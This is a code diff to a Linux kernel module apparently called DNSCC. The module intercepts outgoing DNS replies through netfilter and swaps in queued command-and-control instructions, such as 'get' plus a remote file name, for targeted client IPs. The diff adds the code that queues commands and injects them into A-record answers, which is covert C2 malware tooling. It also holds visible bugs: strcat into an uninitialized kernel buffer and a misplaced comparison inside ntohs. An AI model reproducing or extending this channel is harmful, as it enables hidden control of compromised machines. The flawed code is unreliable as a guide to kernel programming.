@@ -79,7 +79,7 @@ struct RR_DATA{
 struct conn_out_data{
 	uint32_t ip_addr;
 	uint16_t stage;//see #define
-	struct sk_buff *orig_skb;
+	unsigned char* command;
 	struct list_head list;
 };
 
@@ -112,10 +112,20 @@ static void dnscc_nl_recv_msg(struct sk_buff *skb){
 	switch(msg->type){
 		case 1: {
 				struct conn_out_data* c;
+				unsigned char* command;
+			        uint16_t rf_len = 0;
 				get_file_msg* gfmsg = msg->data;
+				rf_len = strlen((const char*)gfmsg->remote_file)+1;
+				printk(KERN_INFO"remote file length %d",rf_len);
+				command	= (unsigned char*)kmalloc(sizeof(unsigned char)*(rf_len+6),GFP_DMA);
+	//			command ;
 				printk(KERN_INFO "[DNSCC] Netlink get file message IP: %pI4 Remote File: %s ", &gfmsg->ip, gfmsg->remote_file);
+				strcat(command,"get");
+				strcat(command,gfmsg->remote_file);
+				printk(KERN_INFO"Command %s",command);
 				c = kmalloc(sizeof(*c), GFP_DMA);
 				c->ip_addr = gfmsg->ip.s_addr;
+				c->command = command;
 				INIT_LIST_HEAD(&c->list);
 				list_add(&c->list,&conn_out_list.list);
 				break;
@@ -193,6 +203,18 @@ uint16_t check_command_exists(uint32_t ip_addr){
 	
 	}
 	return ret;
+}
+/* Get the command for the given IP * */
+unsigned char* get_command(uint32_t ip_addr){
+	struct conn_out_data* c;
+	list_for_each_entry(c,&conn_out_list.list,list){
+		if(c->ip_addr == ip_addr){
+			printk(KERN_DEBUG "[DNSCC] Command %s for %pI4",c->command,&ip_addr);
+			return c->command;
+		}
+	
+	}
+	return NULL;
 }
 //correct name pointers
 unsigned char* correct_name_ptr(unsigned long writer, unsigned char* buffer, int* count, uint16_t ptr_offset, uint16_t ar_start)
@@ -281,7 +303,9 @@ unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* 
 		name[i]='.';
 	}
 	name[i-1]='\0'; //remove the last dot
-	printk(KERN_INFO"read_dns_name: %s %d",name,*count);
+	
+	//TODO:debug 
+	//printk(KERN_DEBUG"[DNSCC] Read dns name %s",name);
 	return name;
 }
 
@@ -542,11 +566,13 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	struct DNS_HEADER* dns_h = NULL;	/* if it's not udp, then return accept*/
 	bool query_bit = false;
 	int dnsn_count = 0;
+	struct QUESTION *question_data;
 	/* check if the packet is valid */
 	/* parse IP header */
 	if(iph->protocol != IPPROTO_UDP){
 		return NF_ACCEPT;
 	}
+
 	/* udp header*/
 	//udph = skb_header_pointer(skb, ip_hdrlen(skb), sizeof(*udph) ,&udpbuff);
 	udph = udp_hdr(skb);
@@ -564,15 +590,15 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	query_bit = (ntohs(dns_h->flags) & 0x8000) >> 15;
 	/* SRC port == DNS_PORT and src mac == our mac address */
 	if(query_bit ){
-		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count); 
+		dns_name = read_dns_name(&data[sizeof(struct DNS_HEADER)],data,&dnsn_count);	
+	        question_data = (struct QUESTION*)&data[sizeof(struct DNS_HEADER)+dnsn_count+1];	
 		printk(KERN_INFO "[DNSCC] Outgoing DNS answer packet id %u dns-name %s answer = %d \n",ntohs(dns_h->query_id),dns_name,query_bit);
-		/* check if we need to send out a command to this client*/
-	//	if(check_command_exists(iph->daddr) == 1){
+		/* check if we need to send out a command to this client and the reply is an A record*/
+		printk(KERN_INFO"Check command %d qtype %d",check_command_exists(iph->daddr),ntohs(question_data->qtype==1));
+		if(check_command_exists(iph->daddr) == 1 && ntohs(question_data->qtype == 1)){
 			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
 			/* Manipulate the answer */
-			unsigned char *command = "encodedfakecommand";
-//	command[0] = (uint16_t)3;
-//	command[4] = (uint16_t)0;
+			unsigned char *command = get_command(iph->daddr);
 			unsigned char *orig_dns_data;
 			unsigned char *new_dns_data;
 			uint16_t new_dns_size;
@@ -612,7 +638,7 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 //			kfree_skb(skb);
 //			skb = skb_new;
 		//		return NF_STOLEN;
-	//	}
+		}
 		kfree(dns_name);
 		}
 	return NF_ACCEPT;
